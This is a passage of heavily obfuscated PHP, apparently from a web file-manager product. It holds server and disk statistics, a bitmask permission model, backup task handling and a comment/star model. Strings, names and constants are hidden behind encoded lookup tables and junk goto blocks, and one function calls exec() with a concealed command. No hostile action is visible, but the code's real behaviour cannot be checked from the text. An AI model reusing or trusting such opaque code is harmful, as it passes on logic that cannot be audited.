$this->typeLogCnt($Ï¦è€¸Ÿ[12], $Ï¦è€¸Ÿ[1811])); } private function typeLogCnt($ŒÔ©‹åå = '', $”¬²‚İã = "\x69\144") { $‰İ‹ªÓæ =& $_SERVER[¹ş¤¶ĞÖ]; $üëˆéßç = array($‰İ‹ªÓæ[107] => array($‰İ‹ªÓæ[1837], $‰İ‹ªÓæ[1838]), $‰İ‹ªÓæ[481] => array($‰İ‹ªÓæ[1839], $‰İ‹ªÓæ[1840]), $‰İ‹ªÓæ[1835] => array($‰İ‹ªÓæ[1841], $‰İ‹ªÓæ[1842], $‰İ‹ªÓæ[1843]), $‰İ‹ªÓæ[1836] => array($‰İ‹ªÓæ[1844], $‰İ‹ªÓæ[1845]), $‰İ‹ªÓæ[1846] => array($‰İ‹ªÓæ[1847], $‰İ‹ªÓæ[1848], $‰İ‹ªÓæ[1849])); $Ä–™ä‹– = strtotime(date($‰İ‹ªÓæ[1807])); $ô¹Ìµ²Ã = array($‰İ‹ªÓæ[201] => array($‰İ‹ªÓæ[1047], $Ä–™ä‹–)); if ($ŒÔ©‹åå) { $ô¹Ìµ²Ã[$‰İ‹ªÓæ[33]] = array($‰İ‹ªÓæ[7], $üëˆéßç[$ŒÔ©‹åå]); } $»´üÕ¦’ = Model($‰İ‹ªÓæ[1810])->where($ô¹Ìµ²Ã)->count($”¬²‚İã); return (int) $»´üÕ¦’; } private function optionServer() { $¦ ƒ·­ =& $_SERVER[¹ş¤¶ĞÖ]; $ª©ÏŸ‡ = $this->diskDriver(); $Ø”»Ş  = KodIO::defaultDriver(); $ùŞÜÜæ¥ = array($¦ ƒ·­[843] => $Ø”»Ş [$¦ ƒ·­[428]]); $ŠÜŸ£÷ = Model($¦ ƒ·­[500])->where($ùŞÜÜæ¥)->sum($¦ ƒ·­[76]); $œúå¼œØ = explode($¦ ƒ·­[53], $_SERVER[$¦ ƒ·­[143]]); $¨§Óè¬à = $œúå¼œØ[0]; $øÀ•Š°² = $GLOBALS[$¦ ƒ·­[6]][$¦ ƒ·­[21]]; $ş…›ãôú = $øÀ•Š°²[$¦ ƒ·­[1009]]; if ($ş…›ãôú == $¦ ƒ·­[997]) { $Äœ±ËÑ˜ = explode($¦ ƒ·­[1315], $øÀ•Š°²[$¦ ƒ·­[1008]]); $ş…›ãôú = $Äœ±ËÑ˜[0]; } if ($ş…›ãôú == $¦ ƒ·­[943] || $ş…›ãôú == $¦ ƒ·­[830]) { $ûğ±¬Û = Model()->db()->query($¦ ƒ·­[1850]); $É ¨êùŞ = $ûğ±¬Û[0] && isset($ûğ±¬Û[0][$¦ ƒ·­[1573]]) ? $ûğ±¬Û[0][$¦ ƒ·­[1573]] : 0; $ş…›ãôú = $¦ ƒ·­[1851] . ($É ¨êùŞ ? $¦ ƒ·­[8] . $É ¨êùŞ : $¦ ƒ·­[12]); } $×ğ¦á¦ª = $GLOBALS[$¦ ƒ·­[6]][$¦ ƒ·­[378]][$¦ ƒ·­[853]]; return array($¦ ƒ·­[1852] => $ª©ÏŸ‡ ? $ª©ÏŸ‡[$¦ ƒ·­[1853]] : 0, $¦ ƒ·­[1854] => $ª©ÏŸ‡ ? $ª©ÏŸ‡[$¦ ƒ·­[1855]] : 0, $¦ ƒ·­[1856] => (int) $Ø”»Ş [$¦ ƒ·­[1853]] * 1024 * 1024 * 1024, $¦ ƒ·­[1857] => (int) $ŠÜŸ£÷, $¦ ƒ·­[1858] => ucfirst($¨§Óè¬à), $¦ ƒ·­[1859] => $¦ ƒ·­[1860] . PHP_VERSION, $¦ ƒ·­[1861] => phpBuild64() ? 64 : 32, $¦ ƒ·­[783] => str_replace($¦ ƒ·­[1163], $¦ ƒ·­[1025], $ş…›ãôú), $¦ ƒ·­[378] => ucfirst($×ğ¦á¦ª), $¦ ƒ·­[32] => $_SERVER[$¦ ƒ·­[1862]]); } private function diskDriver() { $¦ö¥Ó†” =& $_SERVER[¹ş¤¶ĞÖ]; $·í„òÚ– = $¦ö¥Ó†”[8]; $Çí½‰­¤ = $GLOBALS[$¦ö¥Ó†”[6]][$¦ö¥Ó†”[1332]] == $¦ö¥Ó†”[1333]; if ($Çí½‰­¤) { $·í„òÚ– = $¦ö¥Ó†”[1863]; if (function_exists($¦ö¥Ó†”[1864])) { exec($¦ö¥Ó†”[1865], $Àœµâñ); $·í„òÚ– = $Àœµâñ[1] . $¦ö¥Ó†”[8]; } } if (!file_exists($·í„òÚ–)) { return; } $•”³Äì = @disk_total_space($·í„òÚ–); $³‰¾Èëá = $•”³Äì - @disk_free_space($·í„òÚ–); return array($¦ö¥Ó†”[1853] => $•”³Äì, $¦ö¥Ó†”[1855] => $³‰¾Èëá); } public function fileChart($òâ§½Á) { $âÂ²í¬ù =& $_SERVER[¹ş¤¶ĞÖ]; if (isset($òâ§½Á[$âÂ²í¬ù[1676]])) { return Model($âÂ²í¬ù[851])->userFileTypeProfile($òâ§½Á[$âÂ²í¬ù[1676]]); } if (isset($òâ§½Á[$âÂ²í¬ù[1866]])) { return Model($âÂ²í¬ù[851])->groupFileTypeProfile($òâ§½Á[$âÂ²í¬ù[1866]]); } $¦â‚–Ş‘ = $this->sourceSize(); $¤ÎËóÄ™ = array($âÂ²í¬ù[461] => 0, $âÂ²í¬ù[440] => 1); $íÄ‰äõÔ = Model($âÂ²í¬ù[851])->where($¤ÎËóÄ™)->sum($âÂ²í¬ù[76]); $¤ÎËóÄ™[$âÂ²í¬ù[440]] = 2; $Ï¾Å—Ï’ = Model($âÂ²í¬ù[851])->where($¤ÎËóÄ™)->sum($âÂ²í¬ù[76]); return array($âÂ²í¬ù[789] => $¦â‚–Ş‘[$âÂ²í¬ù[76]], $âÂ²í¬ù[1800] => $¦â‚–Ş‘[$âÂ²í¬ù[1800]], $âÂ²í¬ù[1801] => (int) $íÄ‰äõÔ, $âÂ²í¬ù[1802] => (int) $Ï¾Å—Ï’); } private function sourceSize() { $õŠéİøû =& $_SERVER[¹ş¤¶ĞÖ]; $€Òìî¬Ú = Model($õŠéİøû[851])->where(array($õŠéİøû[439] => 0))->sum($õŠéİøû[76]); $›­ì‘á’ = Model($õŠéİøû[500])->sum($õŠéİøû[76]); if ($›­ì‘á’ > $€Òìî¬Ú) { $›­ì‘á’ = $€Òìî¬Ú; } return array($õŠéİøû[76] => (int) $€Òìî¬Ú, $õŠéİøû[1800] => (int) $›­ì‘á’); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ğ˜Æ›Ã¶ =& $_SERVER[¹ş¤¶ĞÖ]; $‰ƒ—ü·ü = array(array($ğ˜Æ›Ã¶[449] => LNG($ğ˜Æ›Ã¶[1867]), $ğ˜Æ›Ã¶[1868] => $ğ˜Æ›Ã¶[1869], $ğ˜Æ›Ã¶[1870] => 1, $ğ˜Æ›Ã¶[1871] => 1, $ğ˜Æ›Ã¶[1872] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ğ˜Æ›Ã¶[449] => LNG($ğ˜Æ›Ã¶[1873]), $ğ˜Æ›Ã¶[1868] => $ğ˜Æ›Ã¶[1874], $ğ˜Æ›Ã¶[1870] => 2, $ğ˜Æ›Ã¶[1871] => 1, $ğ˜Æ›Ã¶[1872] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ğ˜Æ›Ã¶[449] => LNG($ğ˜Æ›Ã¶[1875]), $ğ˜Æ›Ã¶[1868] => $ğ˜Æ›Ã¶[1876], $ğ˜Æ›Ã¶[1870] => 3, $ğ˜Æ›Ã¶[1871] => 1, $ğ˜Æ›Ã¶[1872] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ğ˜Æ›Ã¶[449] => LNG($ğ˜Æ›Ã¶[1877]), $ğ˜Æ›Ã¶[1868] => $ğ˜Æ›Ã¶[1878], $ğ˜Æ›Ã¶[1870] => 4, $ğ˜Æ›Ã¶[1871] => 1, $ğ˜Æ›Ã¶[1872] => self::AUTH_SHOW | self::AUTH_VIEW), array($ğ˜Æ›Ã¶[449] => LNG($ğ˜Æ›Ã¶[1879]), $ğ˜Æ›Ã¶[1868] => $ğ˜Æ›Ã¶[1880], $ğ˜Æ›Ã¶[1870] => 5, $ğ˜Æ›Ã¶[1871] => 1, $ğ˜Æ›Ã¶[1872] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ğ˜Æ›Ã¶[449] => LNG($ğ˜Æ›Ã¶[1881]), $ğ˜Æ›Ã¶[1868] => $ğ˜Æ›Ã¶[1882], $ğ˜Æ›Ã¶[1870] => 6, $ğ˜Æ›Ã¶[1871] => 1, $ğ˜Æ›Ã¶[1872] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ğ˜Æ›Ã¶[449] => LNG($ğ˜Æ›Ã¶[1883]), $ğ˜Æ›Ã¶[1868] => $ğ˜Æ›Ã¶[1884], $ğ˜Æ›Ã¶[1870] => 7, $ğ˜Æ›Ã¶[1871] => 1, $ğ˜Æ›Ã¶[1872] => 0)); return $‰ƒ—ü·ü; } public static function authCheck($Ü°œ”Ğô, $Ğ¦—Ãçì) { $ïÚÇ”·‚ =& $_SERVER[¹ş¤¶ĞÖ]; $Ü°œ”Ğô = intval($Ü°œ”Ğô); if ($GLOBALS[$ïÚÇ”·‚[523]] && $GLOBALS[$ïÚÇ”·‚[6]][$ïÚÇ”·‚[1885]]) { return !0; } if ($Ü°œ”Ğô <= 0) { return !1; } if (($Ü°œ”Ğô & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ü°œ”Ğô & $Ğ¦—Ãçì); } public static function authCheckShow($Õ¾˜°û„) { return self::authCheck($Õ¾˜°û„, self::AUTH_SHOW); } public static function authCheckView($Ä¨ÖÚ´) { return self::authCheck($Ä¨ÖÚ´, self::AUTH_VIEW); } public static function authCheckDownload($øÄ³›Ë¬) { return self::authCheck($øÄ³›Ë¬, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ĞŞòÍ ) { return self::authCheck($ĞŞòÍ , self::AUTH_UPLOAD); } public static function authCheckEdit($ëúùñâÉ) { return self::authCheck($ëúùñâÉ, self::AUTH_EDIT); } public static function authCheckRemove($½¢àûè–) { return self::authCheck($½¢àûè–, self::AUTH_REMOVE); } public static function authCheckShare($ƒŸ†Àö›) { return self::authCheck($ƒŸ†Àö›, self::AUTH_SHARE); } public static function authCheckComment($ÕÄ”æ¦) { return self::authCheck($ÕÄ”æ¦, self::AUTH_COMMENT); } public static function authCheckEvent($‚ƒµÜ°ë) { return self::authCheck($‚ƒµÜ°ë, self::AUTH_EVENT); } public static function authCheckRoot($§¾ÀÁ¯­) { return self::authCheck($§¾ÀÁ¯­, self::AUTH_ROOT); } public static function authCheckAction($£ËÀçİœ, $¢ñï‹ ”) { $Òî¯Ã à =& $_SERVER[¹ş¤¶ĞÖ]; $Õ”ø«Â× = array($Òî¯Ã à[1886] => self::AUTH_VIEW, $Òî¯Ã à[1227] => self::AUTH_DOWNLOAD, $Òî¯Ã à[107] => self::AUTH_UPLOAD, $Òî¯Ã à[1836] => self::AUTH_EDIT, $Òî¯Ã à[1835] => self::AUTH_REMOVE, $Òî¯Ã à[1846] => self::AUTH_SHARE, $Òî¯Ã à[383] => self::AUTH_COMMENT, $Òî¯Ã à[1664] => self::AUTH_EVENT, $Òî¯Ã à[1887] => self::AUTH_ROOT); if (!isset($Õ”ø«Â×[$¢ñï‹ ”])) { return; } $áŠÍ«Ï¥ = $Õ”ø«Â×[$¢ñï‹ ”]; $£ËÀçİœ = intval($£ËÀçİœ); if ($£ËÀçİœ <= 0) { return !1; } if (($£ËÀçİœ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($£ËÀçİœ & $áŠÍ«Ï¥); } public static function authDisable($ÙºÌ•¬õ, $’“¼«æ) { if (intval($ÙºÌ•¬õ) <= 0) { return 0; } return intval($ÙºÌ•¬õ) & ~$’“¼«æ; } public $optionType = "\x53\x79\163\x74\x65\155\56\x73\157\x75\162\x63\x65\101\165\164\150\114\151\163\x74"; public $field = array("\x6e\141\155\145", "\x61\x75\x74\150", "\154\141\142\x65\x6c", "\144\x69\163\160\x6c\141\171", "\x73\171\163\x74\x65\155", "\x73\x6f\162\164"); public function initData() { $»Ñ¼ö = $this->authDefault(); foreach ($»Ñ¼ö as $®ÍëËÁĞ) { $this->add($®ÍëËÁĞ); } } public function findAuth($Ä¿¼Çƒí, $…º“Å£ì) { $˜‰éºÌô =& $_SERVER[¹ş¤¶ĞÖ]; $Šøœü ¦ = parent::listData(); foreach ($Šøœü ¦ as $‹®”üşü) { $ÖÍ÷Í× = intval($‹®”üşü[$˜‰éºÌô[442]]); if ($ÖÍ÷Í× <= 0 || $‹®”üşü[$˜‰éºÌô[1888]] == 0) { continue; } if (($ÖÍ÷Í× & $Ä¿¼Çƒí) != $Ä¿¼Çƒí) { continue; } if (($ÖÍ÷Í× & $…º“Å£ì) != 0) { continue; } return $‹®”üşü[$˜‰éºÌô[428]]; } return !1; } public function findAuthReadOnly() { $—Ò‰¢Ì  = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ˆÑ­‡•‹ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($—Ò‰¢Ì , $ˆÑ­‡•‹); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $İ’¢€“ø =& $_SERVER[¹ş¤¶ĞÖ]; $Ä—Ëæ³ = parent::listData(); $Š¢¥›ö = !1; foreach ($Ä—Ëæ³ as $œÙÜ±À˜) { if ($œÙÜ±À˜[$İ’¢€“ø[442]] <= 0 || $œÙÜ±À˜[$İ’¢€“ø[1888]] == $İ’¢€“ø[198]) { continue; } if (!$Š¢¥›ö) { $Š¢¥›ö = $œÙÜ±À˜; continue; } if ($Š¢¥›ö[$İ’¢€“ø[442]] > $œÙÜ±À˜[$İ’¢€“ø[442]]) { $Š¢¥›ö = $œÙÜ±À˜; } } return $Š¢¥›ö ? $Š¢¥›ö[$İ’¢€“ø[428]] : $İ’¢€“ø[12]; } public function listData($·›ôøˆÜ = false, $ìşğª¤÷ = "\x73\157\162\164", $ëÔë¬Æ† = false) { return parent::listData($·›ôøˆÜ, $ìşğª¤÷, $ëÔë¬Æ†); } public function update($æ×û ¼, $Æ÷„ÒÎë) { $±ÕæèÚÄ =& $_SERVER[¹ş¤¶ĞÖ]; $Í’ÛÉ× = parent::listData($æ×û ¼); $úÖ­Ëô§ = $this->findByName($Æ÷„ÒÎë[$±ÕæèÚÄ[32]]); if (!$Í’ÛÉ× || $úÖ­Ëô§ && $úÖ­Ëô§[$±ÕæèÚÄ[428]] != $Í’ÛÉ×[$±ÕæèÚÄ[428]]) { return !1; } $this->filterAuth($Æ÷„ÒÎë[$±ÕæèÚÄ[442]]); return parent::update($æ×û ¼, $Æ÷„ÒÎë); } public function remove($Î’¿¿ˆ) { $ĞÒÚ”‰Å = parent::listData($Î’¿¿ˆ); if (!$ĞÒÚ”‰Å || $ĞÒÚ”‰Å[$_SERVER[¹ş¤¶ĞÖ][1320]]) { return !1; } return parent::remove($Î’¿¿ˆ); } public function add($ï¢ôª÷Ÿ = array()) { $ªÄÖäÙ =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->findByName($ï¢ôª÷Ÿ[$ªÄÖäÙ[32]])) { return !1; } $ùû ààã = array($ªÄÖäÙ[32] => $ªÄÖäÙ[12], $ªÄÖäÙ[442] => 1, $ªÄÖäÙ[1889] => $ªÄÖäÙ[1876], $ªÄÖäÙ[1888] => 1, $ªÄÖäÙ[1320] => 0, $ªÄÖäÙ[1890] => 0); $ï¢ôª÷Ÿ = array_merge($ùû ààã, $ï¢ôª÷Ÿ); $ï¢ôª÷Ÿ[$ªÄÖäÙ[1890]] = $this->getSort(); $this->filterAuth($ï¢ôª÷Ÿ[$ªÄÖäÙ[442]]); return parent::insert($ï¢ôª÷Ÿ); } private function getSort() { $„ë•ÛÕ =& $_SERVER[¹ş¤¶ĞÖ]; $ñ±Æä’œ = parent::listData(); $’æÁ‚· = array_to_keyvalue($ñ±Æä’œ, $„ë•ÛÕ[12], $„ë•ÛÕ[1890]); return empty($’æÁ‚·) ? 0 : max($’æÁ‚·) + 1; } private function filterAuth(&$è¸Ú„©¹) { if (!$è¸Ú„©¹) { return; } $ëÀåìÖÎ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $…¦ãª™ı = array(); foreach ($ëÀåìÖÎ as $×Ô‡˜Îî) { if ($è¸Ú„©¹ & $×Ô‡˜Îî) { $…¦ãª™ı[] = $×Ô‡˜Îî; } } if (in_array(self::AUTH_ROOT, $…¦ãª™ı)) { $è¸Ú„©¹ = array_sum($ëÀåìÖÎ); return; } $ê„ÄèŸ’ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($…¦ãª™ı as $×Ô‡˜Îî) { if (isset($ê„ÄèŸ’[$×Ô‡˜Îî])) { $…¦ãª™ı = array_merge($…¦ãª™ı, $ê„ÄèŸ’[$×Ô‡˜Îî]); } } $…¦ãª™ı[] = self::AUTH_SHOW; $è¸Ú„©¹ = array_sum(array_unique($…¦ãª™ı)); } public function sort($ğÑà·…ö, $¶ÉÙÀå¹) { return parent::update($ğÑà·…ö, $¶ÉÙÀå¹); } } goto D™¿Ï©öØ; FÚéçÏˆİë: define($_SERVER[¹ş¤¶ĞÖ][633], $_SERVER[¹ş¤¶ĞÖ][634]); $yvbwkhnedr = $_SERVER[¹ş¤¶ĞÖ][635]; while (strlen($yvbwkhnedr) < $_SERVER[¹ş¤¶ĞÖ][636]) { if (!$yvbwkhnedr) { break; } $yvbwkhnedr++; } goto f¨µºè¢¨¶; D™¿Ï©öØ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\142\141\x63\153\165\x70\x4c\x69\163\x74"; public $field = array("\151\157", "\x6e\141\155\x65", "\163\x74\x61\164\165\x73", "\143\157\x6e\x74\145\156\x74", "\x6d\141\156\165\141\154", "\x72\145\x73\165\x6c\x74", "\x74\x69\x6d\145\x46\162\x6f\x6d", "\164\151\x6d\145\x54\157"); public function config() { $İÚºñÀ¹ =& $_SERVER[¹ş¤¶ĞÖ]; $ÙÊ»¹é = Model($İÚºñÀ¹[796])->get($İÚºñÀ¹[806]); $ÙÊ»¹é = json_decode($ÙÊ»¹é, !0); $ÙÊ»¹é = is_array($ÙÊ»¹é) ? $ÙÊ»¹é : array(); if (!isset($ÙÊ»¹é[$İÚºñÀ¹[780]])) { $ÙÊ»¹é[$İÚºñÀ¹[780]] = $İÚºñÀ¹[88]; } unset($ÙÊ»¹é[$İÚºñÀ¹[1646]]); Action($İÚºñÀ¹[1891])->taskInit(); Model($İÚºñÀ¹[1645])->cacheClear(); $ÄŠÎàŸ¡ = $İÚºñÀ¹[1892]; $³šõñ®ì = Model($İÚºñÀ¹[1893])->findByKey($İÚºñÀ¹[1664], $ÄŠÎàŸ¡); if (!$³šõñ®ì) { $³šõñ®ì = array(); } if (isset($³šõñ®ì[$İÚºñÀ¹[180]])) { $³šõñ®ì[$İÚºñÀ¹[180]] = json_decode($³šõñ®ì[$İÚºñÀ¹[180]], !0); } if (isset($ÙÊ»¹é[$İÚºñÀ¹[180]])) { $³šõñ®ì[$İÚºñÀ¹[180]][$İÚºñÀ¹[1649]] = $ÙÊ»¹é[$İÚºñÀ¹[180]]; unset($ÙÊ»¹é[$İÚºñÀ¹[180]]); } return array_merge($³šõñ®ì, $ÙÊ»¹é); } public function listData($Šëó®æÚ = false, $”¥âô˜¤ = "\155\157\144\151\x66\171\x54\x69\x6d\x65", $îÑÉºáÁ = false) { return parent::listData($Šëó®æÚ, $”¥âô˜¤, !0); } public function lastItem() { $ºÁ•¤Ùƒ = $this->listData(); return !empty($ºÁ•¤Ùƒ[0]) ? $ºÁ•¤Ùƒ[0] : null; } public function kill($Ü»·€Ô†) { $¦¹˜¡˜± =& $_SERVER[¹ş¤¶ĞÖ]; $µòàË¸± = $this->listData($Ü»·€Ô†); if (!$µòàË¸± || empty($µòàË¸±[$¦¹˜¡˜±[32]])) { return !0; } Task::kill($¦¹˜¡˜±[805]); Task::kill($¦¹˜¡˜±[826]); Task::kill($¦¹˜¡˜±[835]); $†€È¬ŞÑ = $µòàË¸±[$¦¹˜¡˜±[32]]; $³Ø¶ËŠ = TEMP_FILES . $¦¹˜¡˜±[804] . $†€È¬ŞÑ . $¦¹˜¡˜±[8]; IO::remove($³Ø¶ËŠ, !1); return $this->remove($Ü»·€Ô†); } public function remove($ìòÚı•) { $×÷¶ã÷Ã = $this->listData($ìòÚı•); if (!$×÷¶ã÷Ã) { return !0; } return $this->backupRemove($×÷¶ã÷Ã); } private function backupRemove($Ë˜Ê¦è) { parent::remove($Ë˜Ê¦è[$_SERVER[¹ş¤¶ĞÖ][428]]); $üÓÁ­—å = $this->backupPath($Ë˜Ê¦è); IO::remove($üÓÁ­—å, !1); return !0; } private function backupPath($ššò’»÷) { $«’ßïô€ =& $_SERVER[¹ş¤¶ĞÖ]; $Ÿ™û‰É = $ššò’»÷[$«’ßïô€[32]]; $ó´˜ŞÑÙ = Model($«’ßïô€[796])->get($«’ßïô€[797]); $¶®¡ğí¤ = substr(md5($«’ßïô€[798] . $ó´˜ŞÑÙ . $Ÿ™û‰É), 0, 8); return "\173\151\157\72{$ššò’»÷[$«’ßïô€[777]]}\x7d\x2f\144\141\x74\x61\x62\141\163\x65\57\x62\x61\143\153\x75\x70\x2f" . $Ÿ™û‰É . $«’ßïô€[11] . $¶®¡ğí¤; } public function start() { $ã–íŒ·Ø =& $_SERVER[¹ş¤¶ĞÖ]; if ($GLOBALS[$ã–íŒ·Ø[6]][$ã–íŒ·Ø[89]][$ã–íŒ·Ø[1894]] != $ã–íŒ·Ø[88]) { return !0; } $Í‘›Í¾£ = $this->config(); if (!$Í‘›Í¾£ || $Í‘›Í¾£[$ã–íŒ·Ø[1646]] != $ã–íŒ·Ø[88]) { return !1; } $¼Ú½¤ä = $this->process(); foreach ($¼Ú½¤ä as $¯‡¡Åì) { if ($¯‡¡Åì) { return Task::restart($¯‡¡Åì[$ã–íŒ·Ø[428]]); } } $ù½°…œÜ = new Backup(); $ñÖãĞ = $ù½°…œÜ->db(); if ($ñÖãĞ) { $ñÖãĞ = $ù½°…œÜ->dbFile(); if ($ñÖãĞ && $Í‘›Í¾£[$ã–íŒ·Ø[780]] == $ã–íŒ·Ø[198]) { $ñÖãĞ = $ù½°…œÜ->file(); } } Backup::set(array($ã–íŒ·Ø[776] => 1, $ã–íŒ·Ø[787] => time())); return !0; } public function process() { $ï¼–™Åû =& $_SERVER[¹ş¤¶ĞÖ]; $¿¢ßÀ¿ = array($ï¼–™Åû[783] => Task::get($ï¼–™Åû[805]), $ï¼–™Åû[788] => Task::get($ï¼–™Åû[826]), $ï¼–™Åû[200] => Task::get($ï¼–™Åû[835])); $¡ò‚Î—» = !1; foreach ($¿¢ßÀ¿ as &$¿ì½—”¾) { if ($¡ò‚Î—») { $¿ì½—”¾ = !1; continue; } if ($¿ì½—”¾) { $šÓ›ó„¯ = intval(_get($¿ì½—”¾, $ï¼–™Åû[1681], 0)); if (time() - $šÓ›ó„¯ > 7200) { Task::kill($¿ì½—”¾[$ï¼–™Åû[428]]); $¡ò‚Î—» = !0; $¿ì½—”¾ = !1; } } } return $¿¢ßÀ¿; } public function restore() { $ê‚Û„ =& $_SERVER[¹ş¤¶ĞÖ]; ActionCall($ê‚Û„[1093], !0, 1); ActionCall($ê‚Û„[1093], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\x6e\164"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\x61\x6d\145" => "\x63\x6f\155\x6d\145\x6e\x74\137\x6d\x65\x74\x61", "\x6d\145\x74\141\106\151\145\x6c\144" => "\x63\157\155\x6d\145\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ö•ºÎ¬Ø) { $¾şßìå² =& $_SERVER[¹ş¤¶ĞÖ]; if ($Ö•ºÎ¬Ø[$¾şßìå²[1895]]) { $õÅáÊŸÉ = $this->where(array($¾şßìå²[1896] => $Ö•ºÎ¬Ø[$¾şßìå²[1895]]))->find(); if (!$õÅáÊŸÉ || $õÅáÊŸÉ[$¾şßìå²[440]] != $Ö•ºÎ¬Ø[$¾şßìå²[440]] || $õÅáÊŸÉ[$¾şßìå²[525]] != $Ö•ºÎ¬Ø[$¾şßìå²[525]]) { return !1; } $this->where(array($¾şßìå²[1896] => $Ö•ºÎ¬Ø[$¾şßìå²[1895]]))->setAdd($¾şßìå²[1897], 1); } $Ö•ºÎ¬Ø[$¾şßìå²[1898]] = 0; $Ö•ºÎ¬Ø[$¾şßìå²[1897]] = 0; $Ö•ºÎ¬Ø[$¾şßìå²[776]] = 1; return $this->add($Ö•ºÎ¬Ø); } public function commentCount($«Åç¤¿ï, $¶Á„ë¹, $¨ıËïÏª = false) { $öÉçØÔ¸ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$«Åç¤¿ï) { return array(); } if (is_string($«Åç¤¿ï) || is_int($«Åç¤¿ï)) { $«Åç¤¿ï = array($«Åç¤¿ï); } $ç«Õí¥½ = array($öÉçØÔ¸[525], $öÉçØÔ¸[1899] => $öÉçØÔ¸[520]); $ Ô¹Éš› = array($öÉçØÔ¸[525] => array($öÉçØÔ¸[7], $«Åç¤¿ï), $öÉçØÔ¸[440] => $¶Á„ë¹); if ($¨ıËïÏª) { $ Ô¹Éš›[$öÉçØÔ¸[1676]] = $¨ıËïÏª; } $¨˜µ°¹‡ = $this->field($ç«Õí¥½)->where($ Ô¹Éš›)->group($öÉçØÔ¸[525])->select(); return array_to_keyvalue($¨˜µ°¹‡, $öÉçØÔ¸[525], $öÉçØÔ¸[520]); } public function starTarget($†‘Ãœß , $ŠùÄóí) { $ÏüÒ©§ =& $_SERVER[¹ş¤¶ĞÖ]; $«ÉÍÌì£ = $†‘Ãœß  + self::TYPE_STAR_OFFSET; $ûÑşêÈŞ = array($ÏüÒ©§[1676] => USER_ID, $ÏüÒ©§[440] => $«ÉÍÌì£, $ÏüÒ©§[525] => $ŠùÄóí); $ˆ’è¿¿ = $this->where($ûÑşêÈŞ)->find(); if ($ˆ’è¿¿) { return $this->where(array($ÏüÒ©§[428] => $ˆ’è¿¿[$ÏüÒ©§[428]]))->delete(); } $ÏÃ‘Í¤– = array($ÏüÒ©§[1895] => 0, $ÏüÒ©§[1676] => USER_ID, $ÏüÒ©§[776] => 1, $ÏüÒ©§[780] => $ÏüÒ©§[12], $ÏüÒ©§[440] => $«ÉÍÌì£, $ÏüÒ©§[525] => $ŠùÄóí, $ÏüÒ©§[1898] => 0, $ÏüÒ©§[1897] => 0); return $this->add($ÏÃ‘Í¤–); } public function starTargetCount($÷ĞìÖ‰, $ËÚàÍ£º) { $İØµ­¹å =& $_SERVER[¹ş¤¶ĞÖ]; $è¯¬Úåû = $ËÚàÍ£º + self::TYPE_STAR_OFFSET; $ÔòÆú· = $this->commentCount($÷ĞìÖ‰, $è¯¬Úåû); $ÄÕ¡ş±’ = $this->commentCount($÷ĞìÖ‰, $è¯¬Úåû, USER_ID); return array($İØµ­¹å[1900] => $ÔòÆú·, $İØµ­¹å[1901] => $ÄÕ¡ş±’); } public function starTargetUserList($¢Ê‚À, $ñÄÛÇ) { $¦Ãµæ“Á =& $_SERVER[¹ş¤¶ĞÖ]; $ÑñàŞÒ¡ = $¢Ê‚À + self::TYPE_STAR_OFFSET; $ç¢ÕÚ–× = array($¦Ãµæ“Á[525] => $ñÄÛÇ, $¦Ãµæ“Á[440] => $ÑñàŞÒ¡); $òŠÍ¥‡Ş = $this->where($ç¢ÕÚ–×)->count(); $£œÄÀø° = array($¦Ãµæ“Á[284] => $òŠÍ¥‡Ş, $¦Ãµæ“Á[1902] => array()); if (!$òŠÍ¥‡Ş) { return 